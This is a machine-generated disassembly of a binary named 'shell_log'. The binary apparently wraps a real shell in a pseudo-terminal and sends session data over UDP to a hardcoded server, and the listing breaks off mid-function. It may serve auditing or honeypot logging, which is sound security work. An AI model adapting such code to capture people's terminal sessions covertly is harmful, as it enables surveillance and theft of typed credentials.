
./shell_log:     file format elf64-x86-64


Disassembly of section .init:

0000000000400d98 <_init>:
  400d98:	48 83 ec 08          	sub    $0x8,%rsp
  400d9c:	48 8b 05 55 82 20 00 	mov    0x208255(%rip),%rax        # 608ff8 <_DYNAMIC+0x1e0>
  400da3:	48 85 c0             	test   %rax,%rax
  400da6:	74 05                	je     400dad <_init+0x15>
  400da8:	e8 a3 01 00 00       	callq  400f50 <__gmon_start__@plt>
  400dad:	48 83 c4 08          	add    $0x8,%rsp
  400db1:	c3                   	retq   

Disassembly of section .plt:

0000000000400dc0 <putchar@plt-0x10>:
  400dc0:	ff 35 42 82 20 00    	pushq  0x208242(%rip)        # 609008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400dc6:	ff 25 44 82 20 00    	jmpq   *0x208244(%rip)        # 609010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400dcc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400dd0 <putchar@plt>:
  400dd0:	ff 25 42 82 20 00    	jmpq   *0x208242(%rip)        # 609018 <_GLOBAL_OFFSET_TABLE_+0x18>
  400dd6:	68 00 00 00 00       	pushq  $0x0
  400ddb:	e9 e0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400de0 <__errno_location@plt>:
  400de0:	ff 25 3a 82 20 00    	jmpq   *0x20823a(%rip)        # 609020 <_GLOBAL_OFFSET_TABLE_+0x20>
  400de6:	68 01 00 00 00       	pushq  $0x1
  400deb:	e9 d0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400df0 <puts@plt>:
  400df0:	ff 25 32 82 20 00    	jmpq   *0x208232(%rip)        # 609028 <_GLOBAL_OFFSET_TABLE_+0x28>
  400df6:	68 02 00 00 00       	pushq  $0x2
  400dfb:	e9 c0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e00 <isatty@plt>:
  400e00:	ff 25 2a 82 20 00    	jmpq   *0x20822a(%rip)        # 609030 <_GLOBAL_OFFSET_TABLE_+0x30>
  400e06:	68 03 00 00 00       	pushq  $0x3
  400e0b:	e9 b0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e10 <write@plt>:
  400e10:	ff 25 22 82 20 00    	jmpq   *0x208222(%rip)        # 609038 <_GLOBAL_OFFSET_TABLE_+0x38>
  400e16:	68 04 00 00 00       	pushq  $0x4
  400e1b:	e9 a0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e20 <strlen@plt>:
  400e20:	ff 25 1a 82 20 00    	jmpq   *0x20821a(%rip)        # 609040 <_GLOBAL_OFFSET_TABLE_+0x40>
  400e26:	68 05 00 00 00       	pushq  $0x5
  400e2b:	e9 90 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e30 <__stack_chk_fail@plt>:
  400e30:	ff 25 12 82 20 00    	jmpq   *0x208212(%rip)        # 609048 <_GLOBAL_OFFSET_TABLE_+0x48>
  400e36:	68 06 00 00 00       	pushq  $0x6
  400e3b:	e9 80 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e40 <getuid@plt>:
  400e40:	ff 25 0a 82 20 00    	jmpq   *0x20820a(%rip)        # 609050 <_GLOBAL_OFFSET_TABLE_+0x50>
  400e46:	68 07 00 00 00       	pushq  $0x7
  400e4b:	e9 70 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e50 <htons@plt>:
  400e50:	ff 25 02 82 20 00    	jmpq   *0x208202(%rip)        # 609058 <_GLOBAL_OFFSET_TABLE_+0x58>
  400e56:	68 08 00 00 00       	pushq  $0x8
  400e5b:	e9 60 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e60 <dup2@plt>:
  400e60:	ff 25 fa 81 20 00    	jmpq   *0x2081fa(%rip)        # 609060 <_GLOBAL_OFFSET_TABLE_+0x60>
  400e66:	68 09 00 00 00       	pushq  $0x9
  400e6b:	e9 50 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e70 <printf@plt>:
  400e70:	ff 25 f2 81 20 00    	jmpq   *0x2081f2(%rip)        # 609068 <_GLOBAL_OFFSET_TABLE_+0x68>
  400e76:	68 0a 00 00 00       	pushq  $0xa
  400e7b:	e9 40 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e80 <snprintf@plt>:
  400e80:	ff 25 ea 81 20 00    	jmpq   *0x2081ea(%rip)        # 609070 <_GLOBAL_OFFSET_TABLE_+0x70>
  400e86:	68 0b 00 00 00       	pushq  $0xb
  400e8b:	e9 30 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e90 <strrchr@plt>:
  400e90:	ff 25 e2 81 20 00    	jmpq   *0x2081e2(%rip)        # 609078 <_GLOBAL_OFFSET_TABLE_+0x78>
  400e96:	68 0c 00 00 00       	pushq  $0xc
  400e9b:	e9 20 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ea0 <gmtime_r@plt>:
  400ea0:	ff 25 da 81 20 00    	jmpq   *0x2081da(%rip)        # 609080 <_GLOBAL_OFFSET_TABLE_+0x80>
  400ea6:	68 0d 00 00 00       	pushq  $0xd
  400eab:	e9 10 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400eb0 <gettimeofday@plt>:
  400eb0:	ff 25 d2 81 20 00    	jmpq   *0x2081d2(%rip)        # 609088 <_GLOBAL_OFFSET_TABLE_+0x88>
  400eb6:	68 0e 00 00 00       	pushq  $0xe
  400ebb:	e9 00 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ec0 <ioctl@plt>:
  400ec0:	ff 25 ca 81 20 00    	jmpq   *0x2081ca(%rip)        # 609090 <_GLOBAL_OFFSET_TABLE_+0x90>
  400ec6:	68 0f 00 00 00       	pushq  $0xf
  400ecb:	e9 f0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ed0 <sendto@plt>:
  400ed0:	ff 25 c2 81 20 00    	jmpq   *0x2081c2(%rip)        # 609098 <_GLOBAL_OFFSET_TABLE_+0x98>
  400ed6:	68 10 00 00 00       	pushq  $0x10
  400edb:	e9 e0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ee0 <close@plt>:
  400ee0:	ff 25 ba 81 20 00    	jmpq   *0x2081ba(%rip)        # 6090a0 <_GLOBAL_OFFSET_TABLE_+0xa0>
  400ee6:	68 11 00 00 00       	pushq  $0x11
  400eeb:	e9 d0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ef0 <setsid@plt>:
  400ef0:	ff 25 b2 81 20 00    	jmpq   *0x2081b2(%rip)        # 6090a8 <_GLOBAL_OFFSET_TABLE_+0xa8>
  400ef6:	68 12 00 00 00       	pushq  $0x12
  400efb:	e9 c0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f00 <read@plt>:
  400f00:	ff 25 aa 81 20 00    	jmpq   *0x2081aa(%rip)        # 6090b0 <_GLOBAL_OFFSET_TABLE_+0xb0>
  400f06:	68 13 00 00 00       	pushq  $0x13
  400f0b:	e9 b0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f10 <__libc_start_main@plt>:
  400f10:	ff 25 a2 81 20 00    	jmpq   *0x2081a2(%rip)        # 6090b8 <_GLOBAL_OFFSET_TABLE_+0xb8>
  400f16:	68 14 00 00 00       	pushq  $0x14
  400f1b:	e9 a0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f20 <srand@plt>:
  400f20:	ff 25 9a 81 20 00    	jmpq   *0x20819a(%rip)        # 6090c0 <_GLOBAL_OFFSET_TABLE_+0xc0>
  400f26:	68 15 00 00 00       	pushq  $0x15
  400f2b:	e9 90 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f30 <memcmp@plt>:
  400f30:	ff 25 92 81 20 00    	jmpq   *0x208192(%rip)        # 6090c8 <_GLOBAL_OFFSET_TABLE_+0xc8>
  400f36:	68 16 00 00 00       	pushq  $0x16
  400f3b:	e9 80 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f40 <signal@plt>:
  400f40:	ff 25 8a 81 20 00    	jmpq   *0x20818a(%rip)        # 6090d0 <_GLOBAL_OFFSET_TABLE_+0xd0>
  400f46:	68 17 00 00 00       	pushq  $0x17
  400f4b:	e9 70 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f50 <__gmon_start__@plt>:
  400f50:	ff 25 82 81 20 00    	jmpq   *0x208182(%rip)        # 6090d8 <_GLOBAL_OFFSET_TABLE_+0xd8>
  400f56:	68 18 00 00 00       	pushq  $0x18
  400f5b:	e9 60 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f60 <memcpy@plt>:
  400f60:	ff 25 7a 81 20 00    	jmpq   *0x20817a(%rip)        # 6090e0 <_GLOBAL_OFFSET_TABLE_+0xe0>
  400f66:	68 19 00 00 00       	pushq  $0x19
  400f6b:	e9 50 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f70 <kill@plt>:
  400f70:	ff 25 72 81 20 00    	jmpq   *0x208172(%rip)        # 6090e8 <_GLOBAL_OFFSET_TABLE_+0xe8>
  400f76:	68 1a 00 00 00       	pushq  $0x1a
  400f7b:	e9 40 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f80 <openpty@plt>:
  400f80:	ff 25 6a 81 20 00    	jmpq   *0x20816a(%rip)        # 6090f0 <_GLOBAL_OFFSET_TABLE_+0xf0>
  400f86:	68 1b 00 00 00       	pushq  $0x1b
  400f8b:	e9 30 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f90 <time@plt>:
  400f90:	ff 25 62 81 20 00    	jmpq   *0x208162(%rip)        # 6090f8 <_GLOBAL_OFFSET_TABLE_+0xf8>
  400f96:	68 1c 00 00 00       	pushq  $0x1c
  400f9b:	e9 20 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fa0 <select@plt>:
  400fa0:	ff 25 5a 81 20 00    	jmpq   *0x20815a(%rip)        # 609100 <_GLOBAL_OFFSET_TABLE_+0x100>
  400fa6:	68 1d 00 00 00       	pushq  $0x1d
  400fab:	e9 10 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fb0 <inet_aton@plt>:
  400fb0:	ff 25 52 81 20 00    	jmpq   *0x208152(%rip)        # 609108 <_GLOBAL_OFFSET_TABLE_+0x108>
  400fb6:	68 1e 00 00 00       	pushq  $0x1e
  400fbb:	e9 00 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fc0 <malloc@plt>:
  400fc0:	ff 25 4a 81 20 00    	jmpq   *0x20814a(%rip)        # 609110 <_GLOBAL_OFFSET_TABLE_+0x110>
  400fc6:	68 1f 00 00 00       	pushq  $0x1f
  400fcb:	e9 f0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fd0 <getlogin@plt>:
  400fd0:	ff 25 42 81 20 00    	jmpq   *0x208142(%rip)        # 609118 <_GLOBAL_OFFSET_TABLE_+0x118>
  400fd6:	68 20 00 00 00       	pushq  $0x20
  400fdb:	e9 e0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fe0 <ttyname@plt>:
  400fe0:	ff 25 3a 81 20 00    	jmpq   *0x20813a(%rip)        # 609120 <_GLOBAL_OFFSET_TABLE_+0x120>
  400fe6:	68 21 00 00 00       	pushq  $0x21
  400feb:	e9 d0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ff0 <tcgetattr@plt>:
  400ff0:	ff 25 32 81 20 00    	jmpq   *0x208132(%rip)        # 609128 <_GLOBAL_OFFSET_TABLE_+0x128>
  400ff6:	68 22 00 00 00       	pushq  $0x22
  400ffb:	e9 c0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401000 <tcsetattr@plt>:
  401000:	ff 25 2a 81 20 00    	jmpq   *0x20812a(%rip)        # 609130 <_GLOBAL_OFFSET_TABLE_+0x130>
  401006:	68 23 00 00 00       	pushq  $0x23
  40100b:	e9 b0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401010 <exit@plt>:
  401010:	ff 25 22 81 20 00    	jmpq   *0x208122(%rip)        # 609138 <_GLOBAL_OFFSET_TABLE_+0x138>
  401016:	68 24 00 00 00       	pushq  $0x24
  40101b:	e9 a0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401020 <execv@plt>:
  401020:	ff 25 1a 81 20 00    	jmpq   *0x20811a(%rip)        # 609140 <_GLOBAL_OFFSET_TABLE_+0x140>
  401026:	68 25 00 00 00       	pushq  $0x25
  40102b:	e9 90 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401030 <fork@plt>:
  401030:	ff 25 12 81 20 00    	jmpq   *0x208112(%rip)        # 609148 <_GLOBAL_OFFSET_TABLE_+0x148>
  401036:	68 26 00 00 00       	pushq  $0x26
  40103b:	e9 80 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401040 <rand@plt>:
  401040:	ff 25 0a 81 20 00    	jmpq   *0x20810a(%rip)        # 609150 <_GLOBAL_OFFSET_TABLE_+0x150>
  401046:	68 27 00 00 00       	pushq  $0x27
  40104b:	e9 70 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401050 <usleep@plt>:
  401050:	ff 25 02 81 20 00    	jmpq   *0x208102(%rip)        # 609158 <_GLOBAL_OFFSET_TABLE_+0x158>
  401056:	68 28 00 00 00       	pushq  $0x28
  40105b:	e9 60 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401060 <socket@plt>:
  401060:	ff 25 fa 80 20 00    	jmpq   *0x2080fa(%rip)        # 609160 <_GLOBAL_OFFSET_TABLE_+0x160>
  401066:	68 29 00 00 00       	pushq  $0x29
  40106b:	e9 50 fd ff ff       	jmpq   400dc0 <_init+0x28>

Disassembly of section .text:

0000000000401070 <_start>:
  401070:	31 ed                	xor    %ebp,%ebp
  401072:	49 89 d1             	mov    %rdx,%r9
  401075:	5e                   	pop    %rsi
  401076:	48 89 e2             	mov    %rsp,%rdx
  401079:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  40107d:	50                   	push   %rax
  40107e:	54                   	push   %rsp
  40107f:	49 c7 c0 90 78 40 00 	mov    $0x407890,%r8
  401086:	48 c7 c1 20 78 40 00 	mov    $0x407820,%rcx
  40108d:	48 c7 c7 2d 21 40 00 	mov    $0x40212d,%rdi
  401094:	e8 77 fe ff ff       	callq  400f10 <__libc_start_main@plt>
  401099:	f4                   	hlt    
  40109a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000004010a0 <deregister_tm_clones>:
  4010a0:	b8 e7 91 60 00       	mov    $0x6091e7,%eax
  4010a5:	55                   	push   %rbp
  4010a6:	48 2d e0 91 60 00    	sub    $0x6091e0,%rax
  4010ac:	48 83 f8 0e          	cmp    $0xe,%rax
  4010b0:	48 89 e5             	mov    %rsp,%rbp
  4010b3:	77 02                	ja     4010b7 <deregister_tm_clones+0x17>
  4010b5:	5d                   	pop    %rbp
  4010b6:	c3                   	retq   
  4010b7:	b8 00 00 00 00       	mov    $0x0,%eax
  4010bc:	48 85 c0             	test   %rax,%rax
  4010bf:	74 f4                	je     4010b5 <deregister_tm_clones+0x15>
  4010c1:	5d                   	pop    %rbp
  4010c2:	bf e0 91 60 00       	mov    $0x6091e0,%edi
  4010c7:	ff e0                	jmpq   *%rax
  4010c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004010d0 <register_tm_clones>:
  4010d0:	b8 e0 91 60 00       	mov    $0x6091e0,%eax
  4010d5:	55                   	push   %rbp
  4010d6:	48 2d e0 91 60 00    	sub    $0x6091e0,%rax
  4010dc:	48 c1 f8 03          	sar    $0x3,%rax
  4010e0:	48 89 e5             	mov    %rsp,%rbp
  4010e3:	48 89 c2             	mov    %rax,%rdx
  4010e6:	48 c1 ea 3f          	shr    $0x3f,%rdx
  4010ea:	48 01 d0             	add    %rdx,%rax
  4010ed:	48 d1 f8             	sar    %rax
  4010f0:	75 02                	jne    4010f4 <register_tm_clones+0x24>
  4010f2:	5d                   	pop    %rbp
  4010f3:	c3                   	retq   
  4010f4:	ba 00 00 00 00       	mov    $0x0,%edx
  4010f9:	48 85 d2             	test   %rdx,%rdx
  4010fc:	74 f4                	je     4010f2 <register_tm_clones+0x22>
  4010fe:	5d                   	pop    %rbp
  4010ff:	48 89 c6             	mov    %rax,%rsi
  401102:	bf e0 91 60 00       	mov    $0x6091e0,%edi
  401107:	ff e2                	jmpq   *%rdx
  401109:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401110 <__do_global_dtors_aux>:
  401110:	80 3d c9 80 20 00 00 	cmpb   $0x0,0x2080c9(%rip)        # 6091e0 <__TMC_END__>
  401117:	75 11                	jne    40112a <__do_global_dtors_aux+0x1a>
  401119:	55                   	push   %rbp
  40111a:	48 89 e5             	mov    %rsp,%rbp
  40111d:	e8 7e ff ff ff       	callq  4010a0 <deregister_tm_clones>
  401122:	5d                   	pop    %rbp
  401123:	c6 05 b6 80 20 00 01 	movb   $0x1,0x2080b6(%rip)        # 6091e0 <__TMC_END__>
  40112a:	f3 c3                	repz retq 
  40112c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401130 <frame_dummy>:
  401130:	48 83 3d d8 7c 20 00 	cmpq   $0x0,0x207cd8(%rip)        # 608e10 <__JCR_END__>
  401137:	00 
  401138:	74 1e                	je     401158 <frame_dummy+0x28>
  40113a:	b8 00 00 00 00       	mov    $0x0,%eax
  40113f:	48 85 c0             	test   %rax,%rax
  401142:	74 14                	je     401158 <frame_dummy+0x28>
  401144:	55                   	push   %rbp
  401145:	bf 10 8e 60 00       	mov    $0x608e10,%edi
  40114a:	48 89 e5             	mov    %rsp,%rbp
  40114d:	ff d0                	callq  *%rax
  40114f:	5d                   	pop    %rbp
  401150:	e9 7b ff ff ff       	jmpq   4010d0 <register_tm_clones>
  401155:	0f 1f 00             	nopl   (%rax)
  401158:	e9 73 ff ff ff       	jmpq   4010d0 <register_tm_clones>

000000000040115d <sighandler>:
  40115d:	55                   	push   %rbp
  40115e:	48 89 e5             	mov    %rsp,%rbp
  401161:	48 83 ec 10          	sub    $0x10,%rsp
  401165:	89 7d fc             	mov    %edi,-0x4(%rbp)
  401168:	83 7d fc 1c          	cmpl   $0x1c,-0x4(%rbp)
  40116c:	75 19                	jne    401187 <sighandler+0x2a>
  40116e:	c7 05 6c 80 20 00 01 	movl   $0x1,0x20806c(%rip)        # 6091e4 <got_sigwinch>
  401175:	00 00 00 
  401178:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40117b:	be 5d 11 40 00       	mov    $0x40115d,%esi
  401180:	89 c7                	mov    %eax,%edi
  401182:	e8 b9 fd ff ff       	callq  400f40 <signal@plt>
  401187:	83 7d fc 11          	cmpl   $0x11,-0x4(%rbp)
  40118b:	75 0a                	jne    401197 <sighandler+0x3a>
  40118d:	c7 05 51 80 20 00 01 	movl   $0x1,0x208051(%rip)        # 6091e8 <got_sigchld>
  401194:	00 00 00 
  401197:	c9                   	leaveq 
  401198:	c3                   	retq   

0000000000401199 <setup_terminal>:
  401199:	55                   	push   %rbp
  40119a:	48 89 e5             	mov    %rsp,%rbp
  40119d:	53                   	push   %rbx
  40119e:	48 83 ec 78          	sub    $0x78,%rsp
  4011a2:	89 7d 8c             	mov    %edi,-0x74(%rbp)
  4011a5:	48 89 75 80          	mov    %rsi,-0x80(%rbp)
  4011a9:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4011b0:	00 00 
  4011b2:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4011b6:	31 c0                	xor    %eax,%eax
  4011b8:	c7 45 9c 00 00 00 00 	movl   $0x0,-0x64(%rbp)
  4011bf:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4011c3:	48 83 c0 18          	add    $0x18,%rax
  4011c7:	48 89 c6             	mov    %rax,%rsi
  4011ca:	bf 00 00 00 00       	mov    $0x0,%edi
  4011cf:	e8 1c fe ff ff       	callq  400ff0 <tcgetattr@plt>
  4011d4:	89 45 9c             	mov    %eax,-0x64(%rbp)
  4011d7:	83 7d 9c 00          	cmpl   $0x0,-0x64(%rbp)
  4011db:	74 5a                	je     401237 <setup_terminal+0x9e>
  4011dd:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  4011e1:	48 89 c7             	mov    %rax,%rdi
  4011e4:	e8 9c 1a 00 00       	callq  402c85 <pretty_time>
  4011e9:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  4011ed:	48 89 c2             	mov    %rax,%rdx
  4011f0:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4011f5:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4011fa:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ff:	e8 6c fc ff ff       	callq  400e70 <printf@plt>
  401204:	be 50 7b 40 00       	mov    $0x407b50,%esi
  401209:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  40120e:	b8 00 00 00 00       	mov    $0x0,%eax
  401213:	e8 58 fc ff ff       	callq  400e70 <printf@plt>
  401218:	e8 c3 fb ff ff       	callq  400de0 <__errno_location@plt>
  40121d:	8b 00                	mov    (%rax),%eax
  40121f:	89 c6                	mov    %eax,%esi
  401221:	bf d8 78 40 00       	mov    $0x4078d8,%edi
  401226:	b8 00 00 00 00       	mov    $0x0,%eax
  40122b:	e8 40 fc ff ff       	callq  400e70 <printf@plt>
  401230:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401235:	eb 7e                	jmp    4012b5 <setup_terminal+0x11c>
  401237:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40123b:	48 8d 48 18          	lea    0x18(%rax),%rcx
  40123f:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  401243:	ba 3c 00 00 00       	mov    $0x3c,%edx
  401248:	48 89 ce             	mov    %rcx,%rsi
  40124b:	48 89 c7             	mov    %rax,%rdi
  40124e:	e8 0d fd ff ff       	callq  400f60 <memcpy@plt>
  401253:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  401257:	48 8d 50 18          	lea    0x18(%rax),%rdx
  40125b:	8b 45 8c             	mov    -0x74(%rbp),%eax
  40125e:	be 00 00 00 00       	mov    $0x0,%esi
  401263:	89 c7                	mov    %eax,%edi
  401265:	e8 96 fd ff ff       	callq  401000 <tcsetattr@plt>
  40126a:	8b 45 a0             	mov    -0x60(%rbp),%eax
  40126d:	83 c8 04             	or     $0x4,%eax
  401270:	89 45 a0             	mov    %eax,-0x60(%rbp)
  401273:	8b 45 a0             	mov    -0x60(%rbp),%eax
  401276:	25 1f e2 ff ff       	and    $0xffffe21f,%eax
  40127b:	89 45 a0             	mov    %eax,-0x60(%rbp)
  40127e:	8b 45 ac             	mov    -0x54(%rbp),%eax
  401281:	25 84 7f ff ff       	and    $0xffff7f84,%eax
  401286:	89 45 ac             	mov    %eax,-0x54(%rbp)
  401289:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  40128c:	83 e0 fe             	and    $0xfffffffe,%eax
  40128f:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  401292:	c6 45 b7 01          	movb   $0x1,-0x49(%rbp)
  401296:	c6 45 b6 00          	movb   $0x0,-0x4a(%rbp)
  40129a:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  40129e:	48 89 c2             	mov    %rax,%rdx
  4012a1:	be 00 00 00 00       	mov    $0x0,%esi
  4012a6:	bf 00 00 00 00       	mov    $0x0,%edi
  4012ab:	e8 50 fd ff ff       	callq  401000 <tcsetattr@plt>
  4012b0:	b8 00 00 00 00       	mov    $0x0,%eax
  4012b5:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  4012b9:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  4012c0:	00 00 
  4012c2:	74 05                	je     4012c9 <setup_terminal+0x130>
  4012c4:	e8 67 fb ff ff       	callq  400e30 <__stack_chk_fail@plt>
  4012c9:	48 83 c4 78          	add    $0x78,%rsp
  4012cd:	5b                   	pop    %rbx
  4012ce:	5d                   	pop    %rbp
  4012cf:	c3                   	retq   

00000000004012d0 <reset_terminal>:
  4012d0:	55                   	push   %rbp
  4012d1:	48 89 e5             	mov    %rsp,%rbp
  4012d4:	48 83 ec 10          	sub    $0x10,%rsp
  4012d8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  4012dc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4012e0:	48 83 c0 18          	add    $0x18,%rax
  4012e4:	48 89 c2             	mov    %rax,%rdx
  4012e7:	be 00 00 00 00       	mov    $0x0,%esi
  4012ec:	bf 00 00 00 00       	mov    $0x0,%edi
  4012f1:	e8 0a fd ff ff       	callq  401000 <tcsetattr@plt>
  4012f6:	c9                   	leaveq 
  4012f7:	c3                   	retq   

00000000004012f8 <create_server_connection>:
  4012f8:	55                   	push   %rbp
  4012f9:	48 89 e5             	mov    %rsp,%rbp
  4012fc:	48 83 ec 30          	sub    $0x30,%rsp
  401300:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  401304:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40130b:	00 00 
  40130d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401311:	31 c0                	xor    %eax,%eax
  401313:	ba 11 00 00 00       	mov    $0x11,%edx
  401318:	be 02 00 00 00       	mov    $0x2,%esi
  40131d:	bf 02 00 00 00       	mov    $0x2,%edi
  401322:	e8 39 fd ff ff       	callq  401060 <socket@plt>
  401327:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40132b:	89 02                	mov    %eax,(%rdx)
  40132d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401331:	8b 00                	mov    (%rax),%eax
  401333:	85 c0                	test   %eax,%eax
  401335:	79 5a                	jns    401391 <create_server_connection+0x99>
  401337:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  40133b:	48 89 c7             	mov    %rax,%rdi
  40133e:	e8 42 19 00 00       	callq  402c85 <pretty_time>
  401343:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  401347:	48 89 c2             	mov    %rax,%rdx
  40134a:	be c1 78 40 00       	mov    $0x4078c1,%esi
  40134f:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  401354:	b8 00 00 00 00       	mov    $0x0,%eax
  401359:	e8 12 fb ff ff       	callq  400e70 <printf@plt>
  40135e:	be 60 7b 40 00       	mov    $0x407b60,%esi
  401363:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  401368:	b8 00 00 00 00       	mov    $0x0,%eax
  40136d:	e8 fe fa ff ff       	callq  400e70 <printf@plt>
  401372:	e8 69 fa ff ff       	callq  400de0 <__errno_location@plt>
  401377:	8b 00                	mov    (%rax),%eax
  401379:	89 c6                	mov    %eax,%esi
  40137b:	bf ff 78 40 00       	mov    $0x4078ff,%edi
  401380:	b8 00 00 00 00       	mov    $0x0,%eax
  401385:	e8 e6 fa ff ff       	callq  400e70 <printf@plt>
  40138a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40138f:	eb 41                	jmp    4013d2 <create_server_connection+0xda>
  401391:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401395:	66 c7 40 04 02 00    	movw   $0x2,0x4(%rax)
  40139b:	bf b7 9c 00 00       	mov    $0x9cb7,%edi
  4013a0:	e8 ab fa ff ff       	callq  400e50 <htons@plt>
  4013a5:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  4013a9:	66 89 42 06          	mov    %ax,0x6(%rdx)
  4013ad:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4013b1:	48 83 c0 08          	add    $0x8,%rax
  4013b5:	48 89 c6             	mov    %rax,%rsi
  4013b8:	bf 1a 79 40 00       	mov    $0x40791a,%edi
  4013bd:	e8 ee fb ff ff       	callq  400fb0 <inet_aton@plt>
  4013c2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4013c6:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%rax)
  4013cd:	b8 00 00 00 00       	mov    $0x0,%eax
  4013d2:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  4013d6:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
  4013dd:	00 00 
  4013df:	74 05                	je     4013e6 <create_server_connection+0xee>
  4013e1:	e8 4a fa ff ff       	callq  400e30 <__stack_chk_fail@plt>
  4013e6:	c9                   	leaveq 
  4013e7:	c3                   	retq   

00000000004013e8 <create_real_shell_run_cmd>:
  4013e8:	55                   	push   %rbp
  4013e9:	48 89 e5             	mov    %rsp,%rbp
  4013ec:	53                   	push   %rbx
  4013ed:	48 83 ec 68          	sub    $0x68,%rsp
  4013f1:	89 7d ac             	mov    %edi,-0x54(%rbp)
  4013f4:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
  4013f8:	48 89 55 98          	mov    %rdx,-0x68(%rbp)
  4013fc:	89 4d a8             	mov    %ecx,-0x58(%rbp)
  4013ff:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401406:	00 00 
  401408:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  40140c:	31 c0                	xor    %eax,%eax
  40140e:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
  401415:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%rbp)
  40141c:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  401420:	48 8b 00             	mov    (%rax),%rax
  401423:	be 2f 00 00 00       	mov    $0x2f,%esi
  401428:	48 89 c7             	mov    %rax,%rdi
  40142b:	e8 60 fa ff ff       	callq  400e90 <strrchr@plt>
  401430:	48 83 c0 01          	add    $0x1,%rax
  401434:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
